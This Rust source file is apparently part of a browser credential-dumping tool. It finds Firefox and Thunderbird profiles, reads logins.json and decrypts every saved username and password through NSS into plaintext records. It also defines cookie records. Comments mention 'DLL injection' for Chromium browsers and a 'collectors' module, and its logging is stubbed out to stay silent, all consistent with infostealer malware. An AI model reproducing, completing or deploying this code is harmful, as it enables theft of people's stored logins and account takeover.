use anyhow::Result;

// 条件コンパイル対応のログマクロ
#[cfg(not(feature = "logging"))]
macro_rules! debug {
    ($($arg:tt)*) => {
        let _ = format_args!($($arg)*);
    };
}

#[cfg(not(feature = "logging"))]
macro_rules! info {
    ($($arg:tt)*) => {
        let _ = format_args!($($arg)*);
    };
}

// 外部クレートのインポート（最適化済み）
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
// 未使用インポート削除：chrono, tempfile関連

// ===============================================================================
// エラー型定義
// ===============================================================================

/// アプリケーション全体のエラー型
#[derive(Debug)]
pub enum ChromiumDumpError {
    Io(std::io::Error),
    Json(serde_json::Error),
    #[cfg(feature = "browser")]
    Database(rusqlite::Error),
    Crypto(String),
    Dpapi(String),
    Base64(base64::DecodeError),
    Utf8(std::string::FromUtf8Error),
    InvalidFormat(String),
    Generic(String),
}

impl std::fmt::Display for ChromiumDumpError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ChromiumDumpError::Io(e) => write!(f, "IO error: {}", e),
            ChromiumDumpError::Json(e) => write!(f, "JSON parsing error: {}", e),
            #[cfg(feature = "browser")]
            ChromiumDumpError::Database(e) => write!(f, "Database error: {}", e),
            ChromiumDumpError::Crypto(e) => write!(f, "Cryptographic error: {}", e),
            ChromiumDumpError::Dpapi(e) => write!(f, "DPAPI error: {}", e),
            ChromiumDumpError::Base64(e) => write!(f, "Base64 decode error: {}", e),
            ChromiumDumpError::Utf8(e) => write!(f, "UTF-8 decode error: {}", e),
            ChromiumDumpError::InvalidFormat(e) => write!(f, "Invalid data format: {}", e),
            ChromiumDumpError::Generic(e) => write!(f, "Generic error: {}", e),
        }
    }
}

impl std::error::Error for ChromiumDumpError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            ChromiumDumpError::Io(e) => Some(e),
            ChromiumDumpError::Json(e) => Some(e),
            #[cfg(feature = "browser")]
            ChromiumDumpError::Database(e) => Some(e),
            ChromiumDumpError::Base64(e) => Some(e),
            ChromiumDumpError::Utf8(e) => Some(e),
            _ => None,
        }
    }
}

// From trait implementations
impl From<std::io::Error> for ChromiumDumpError {
    fn from(error: std::io::Error) -> Self {
        ChromiumDumpError::Io(error)
    }
}

impl From<serde_json::Error> for ChromiumDumpError {
    fn from(error: serde_json::Error) -> Self {
        ChromiumDumpError::Json(error)
    }
}

#[cfg(feature = "browser")]
impl From<rusqlite::Error> for ChromiumDumpError {
    fn from(error: rusqlite::Error) -> Self {
        ChromiumDumpError::Database(error)
    }
}

impl From<base64::DecodeError> for ChromiumDumpError {
    fn from(error: base64::DecodeError) -> Self {
        ChromiumDumpError::Base64(error)
    }
}

impl From<std::string::FromUtf8Error> for ChromiumDumpError {
    fn from(error: std::string::FromUtf8Error) -> Self {
        ChromiumDumpError::Utf8(error)
    }
}

impl From<&str> for ChromiumDumpError {
    fn from(s: &str) -> Self {
        ChromiumDumpError::Generic(s.to_string())
    }
}

impl From<String> for ChromiumDumpError {
    fn from(s: String) -> Self {
        ChromiumDumpError::Generic(s)
    }
}

type ChromiumResult<T> = std::result::Result<T, ChromiumDumpError>;

// ===============================================================================
// ブラウザ型定義
// ===============================================================================

/// ブラウザの種類（Firefoxのみ）
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum BrowserType {
    Firefox,         // Firefox
    FirefoxDev,      // Firefox Developer Edition
    FirefoxNightly,  // Firefox Nightly
    Thunderbird,     // Thunderbird（Firefoxベース）
}

impl BrowserType {
    /// ブラウザ名を文字列として取得
    pub fn name(&self) -> &'static str {
        match self {
            BrowserType::Firefox => "Firefox",
            BrowserType::FirefoxDev => "Firefox Developer Edition",
            BrowserType::FirefoxNightly => "Firefox Nightly",
            BrowserType::Thunderbird => "Thunderbird",
        }
    }

    /// ブラウザのユーザーデータディレクトリパスを取得
    pub fn user_data_path(&self) -> Option<PathBuf> {
        use BrowserType::*;
        
        let (env_var, relative_path) = match self {
            // Firefoxベースブラウザのみ
            Firefox => ("APPDATA", r"Mozilla\Firefox"),
            FirefoxDev => ("APPDATA", r"Mozilla\Firefox Developer Edition"),
            FirefoxNightly => ("APPDATA", r"Mozilla\Firefox Nightly"),
            Thunderbird => ("APPDATA", r"Thunderbird"),
        };
        
        std::env::var(env_var)
            .ok()
            .map(|base| PathBuf::from(base).join(relative_path))
    }

    /// ブラウザがChromiumベースかどうかを判定（Firefoxのみなので常にfalse）
    pub fn is_chromium_based(&self) -> bool {
        false
    }

    /// すべてのサポートされているブラウザを取得（Firefoxのみ）
    pub fn all() -> Vec<BrowserType> {
        use BrowserType::*;
        vec![Firefox, FirefoxDev, FirefoxNightly, Thunderbird]
    }
}

/// データベースの種類（Firefoxのみ）
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DatabaseType {
    FirefoxLoginData,   // Firefox用（logins.json）
    FirefoxSignons,     // Firefox用（signons.sqlite）
}

impl DatabaseType {
    /// データベースファイル名を取得
    pub fn filename(&self) -> &'static str {
        match self {
            DatabaseType::FirefoxLoginData => "logins.json",
            DatabaseType::FirefoxSignons => "signons.sqlite",
        }
    }
}

/// ブラウザプロファイル情報
#[derive(Debug, Clone)]
pub struct BrowserProfile {
    pub browser_type: BrowserType,
    pub profile_name: String,
    pub profile_path: PathBuf,
    pub local_state_path: PathBuf,
}

impl BrowserProfile {
    pub fn new(
        browser_type: BrowserType,
        profile_name: String,
        profile_path: PathBuf,
        local_state_path: PathBuf,
    ) -> Self {
        Self {
            browser_type,
            profile_name,
            profile_path,
            local_state_path,
        }
    }

    /// 指定されたデータベースタイプのファイルパスを取得
    pub fn database_path(&self, db_type: &DatabaseType) -> PathBuf {
        // Firefoxプロファイルは直接プロファイルディレクトリ内
        self.profile_path.join(db_type.filename())
    }

    /// ブラウザがFirefoxベースかどうかを判定
    pub fn is_firefox_based(&self) -> bool {
        matches!(self.browser_type, BrowserType::Firefox | BrowserType::FirefoxDev | 
                 BrowserType::FirefoxNightly | BrowserType::Thunderbird)
    }
}

// ===============================================================================
// 暗号化関連
// ===============================================================================

// Chromium復号化関数は削除されました
// DLL注入での復号化を使用してください

// ===============================================================================
// データベース処理
// ===============================================================================

/// ログイン情報
#[derive(Debug, Clone)]
pub struct LoginEntry {
    pub browser_name: String,
    pub origin_url: String,
    pub username: String,
    pub password: String,
    #[cfg(feature = "datetime")]
    pub date_created: Option<DateTime<Utc>>,
    #[cfg(feature = "datetime")]
    pub date_last_used: Option<DateTime<Utc>>,
    #[cfg(not(feature = "datetime"))]
    pub date_created: Option<i64>,
    #[cfg(not(feature = "datetime"))]
    pub date_last_used: Option<i64>,
}

/// Cookie情報
#[derive(Debug, Clone)]
pub struct CookieEntry {
    pub browser_name: String,
    pub host_key: String,
    pub name: String,
    pub value: String,
}

/// データベース処理結果
#[derive(Debug)]
pub struct DatabaseResults {
    pub login_entries: Vec<LoginEntry>,
    pub cookie_entries: Vec<CookieEntry>,
}

impl DatabaseResults {
    pub fn new() -> Self {
        Self {
            login_entries: Vec::new(),
            cookie_entries: Vec::new(),
        }
    }

    pub fn total_count(&self) -> usize {
        self.login_entries.len() + self.cookie_entries.len()
    }

    pub fn browser_stats(&self) -> HashMap<String, usize> {
        let mut stats = HashMap::new();
        
        // ログインエントリとCookieエントリを統合してカウント
        self.login_entries.iter()
            .map(|entry| &entry.browser_name)
            .chain(self.cookie_entries.iter().map(|entry| &entry.browser_name))
            .for_each(|browser_name| {
                *stats.entry(browser_name.clone()).or_insert(0) += 1;
            });
        
        stats
    }
}

// Chromium関連の関数は削除されました（Firefox NSSのみ対応）

// Chromiumログインデータベース処理は削除されました

/// Firefox専用ログインデータベースを処理（NSS復号化対応）
pub fn process_firefox_database(
    profile: &BrowserProfile,
) -> ChromiumResult<Vec<LoginEntry>> {
    let _ = ();

    let mut results = Vec::new();
    
    // まずJSONファイルの存在を確認
    let json_path = profile.database_path(&DatabaseType::FirefoxLoginData);
    if !json_path.exists() {
        let _ = ();
        return Ok(results);
    }

    // JSONデータを読み込み
    let json_content = match fs::read_to_string(&json_path) {
        Ok(content) => content,
        Err(_e) => {
            let _ = ();
            return Ok(results);
        }
    };

    let json_value = match serde_json::from_str::<serde_json::Value>(&json_content) {
        Ok(value) => value,
        Err(_e) => {
            let _ = ();
            return Ok(results);
        }
    };

    let logins_array = match json_value.get("logins").and_then(|v| v.as_array()) {
        Some(array) => array,
        None => {
            let _ = ();
            return Ok(results);
        }
    };

    // NSS復号化を試行（安全な実装）
    match safe_nss_decrypt_logins(&profile.profile_path, logins_array) {
        Ok(mut decrypted_results) => {
            let _ = ();
            for entry in &mut decrypted_results {
                entry.browser_name = profile.browser_type.name().to_string();
            }
            results.extend(decrypted_results);
        }
        Err(_e) => {
            let _ = ();
            
            // フォールバック: 暗号化されたデータの情報のみを表示
            for login in logins_array {
                if let Some(hostname) = login.get("hostname").and_then(|v| v.as_str()) {
                    let username = login.get("encryptedUsername")
                        .and_then(|v| v.as_str())
                        .unwrap_or("[No username]");
                        
                    results.push(LoginEntry {
                        browser_name: format!("{} [ENCRYPTED]", profile.browser_type.name()),
                        origin_url: hostname.to_string(),
                        username: format!("[ENCRYPTED] {}", username),
                        password: "[NSS_DECRYPTION_FAILED]".to_string(),
                        date_created: None,
                        date_last_used: None,
                    });
                }
            }
        }
    }

    let _ = ();
    Ok(results)
}

/// NSS復号化を安全に実行
fn safe_nss_decrypt_logins(
    profile_path: &Path, 
    logins_array: &[serde_json::Value]
) -> ChromiumResult<Vec<LoginEntry>> {
    use std::time::{Duration, Instant};
    
    // NSS初期化の同期とタイムアウト機能
    static NSS_MUTEX: Mutex<()> = Mutex::new(());
    const NSS_TIMEOUT: Duration = Duration::from_secs(10);
    
    let _lock = NSS_MUTEX.try_lock()
        .map_err(|_| ChromiumDumpError::Crypto("NSS is already in use by another process".to_string()))?;
    
    let start_time = Instant::now();
    
    // NSS初期化を段階的に実行
    let nss = initialize_nss_safely(profile_path)
        .map_err(|e| {
            let _ = ();
            ChromiumDumpError::Crypto(format!("NSS init failed: {}", e))
        })?;
    
    let (mut success_count, mut error_count) = (0, 0);
    
    // タイムアウトチェック付きでログインを復号化
    let results: Vec<_> = logins_array.iter()
        .take_while(|_| start_time.elapsed() <= NSS_TIMEOUT)
        .filter_map(|login| {
            match decrypt_firefox_login(&nss, login) {
                Ok(Some(entry)) => {
                    success_count += 1;
                    Some(entry)
                }
                Ok(None) => None, // スキップされたエントリ
                Err(_e) => {
                    error_count += 1;
                    let _ = ();
                    None
                }
            }
        })
        .collect();
    
    if start_time.elapsed() > NSS_TIMEOUT {
        let _ = ();
    }
    
    // NSS安全シャットダウン
    if let Err(_e) = nss.shutdown() {
        let _ = ();
    }
    
    let _ = ();
    
    if results.is_empty() && error_count > 0 {
        return Err(ChromiumDumpError::Crypto("All NSS decryption attempts failed".to_string()));
    }
    
    Ok(results)
}

/// NSS初期化を安全に実行
fn initialize_nss_safely(profile_path: &Path) -> Result<crate::collectors::firefox_nss::Nss, Box<dyn std::error::Error>> {
    let _ = ();
    
    // NSS依存関係の事前チェック
    if !profile_path.is_dir() {
        return Err(format!("Invalid profile path: {:?}", profile_path).into());
    }
    
    // 必要なNSSファイルの存在確認
    let nss_files = [
        ("cert9.db", "key4.db"), // SQLite形式のNSS
        ("cert8.db", "key3.db"), // レガシー形式のNSS
    ];
    
    let has_nss_files = nss_files.iter()
        .any(|(cert, key)| profile_path.join(cert).exists() || profile_path.join(key).exists());
    
    if !has_nss_files {
        return Err("No NSS database files found in profile".into());
    }
    
    // NSS 初期化を試行
    let nss = crate::collectors::firefox_nss::Nss::new()
        .map_err(|e| format!("Failed to load NSS library: {}", e))?;
    
    nss.initialize(profile_path)
        .map_err(|e| format!("Failed to initialize NSS with profile: {}", e))?;
    
    Ok(nss)
}

/// 個別のFirefoxログインエントリを復号化
fn decrypt_firefox_login(
    nss: &crate::collectors::firefox_nss::Nss,
    login: &serde_json::Value
) -> Result<Option<LoginEntry>, Box<dyn std::error::Error>> {
    let hostname = login.get("hostname")
        .and_then(|v| v.as_str())
        .ok_or("Missing hostname")?;
    
    let encrypted_username = login.get("encryptedUsername")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    
    let encrypted_password = login.get("encryptedPassword")
        .and_then(|v| v.as_str())
        .ok_or("Missing encrypted password")?;
    
    // 空の暗号化データはスキップ
    if encrypted_password.is_empty() {
        return Ok(None);
    }
    
    // 復号化実行
    let decrypted_username = if encrypted_username.is_empty() {
        "[No username]".to_string()
    } else {
        nss.decrypt(encrypted_username)
            .unwrap_or_else(|_| "[Decrypt failed]".to_string())
    };
    
    let decrypted_password = nss.decrypt(encrypted_password)
        .map_err(|e| format!("Password decryption failed: {}", e))?;
    
    // 日時情報の取得（オプション）
    #[cfg(feature = "datetime")]
    let date_created = login.get("timeCreated")
        .and_then(|v| v.as_u64())
        .map(|ts| chrono::DateTime::from_timestamp_millis(ts as i64))
        .flatten();
    
    #[cfg(not(feature = "datetime"))]
    let date_created = login.get("timeCreated")
        .and_then(|v| v.as_u64())
        .map(|ts| ts as i64);
    
    #[cfg(feature = "datetime")]
    let date_last_used = login.get("timeLastUsed")
        .and_then(|v| v.as_u64())
        .map(|ts| chrono::DateTime::from_timestamp_millis(ts as i64))
        .flatten();
        
    #[cfg(not(feature = "datetime"))]
    let date_last_used = login.get("timeLastUsed")
        .and_then(|v| v.as_u64())
        .map(|ts| ts as i64);
    
    Ok(Some(LoginEntry {
        browser_name: "Firefox".to_string(), // 呼び出し元で上書きされる
        origin_url: hostname.to_string(),
        username: decrypted_username,
        password: decrypted_password,
        date_created,
        date_last_used,
    }))
}

// Chromium Cookieデータベース処理は削除されました

// ===============================================================================
// スキャナー
// ===============================================================================

// ChromiumScannerクラスは削除されました
// DLL注入とFirefox NSS復号化のみを使用してください

// ===============================================================================
// メイン実行関数
// ===============================================================================

// Chromium復号化機能は削除されました
// DLL注入とFirefox NSS復号化のみを使用してください

// Chrominumデータ実行関数は削除されました
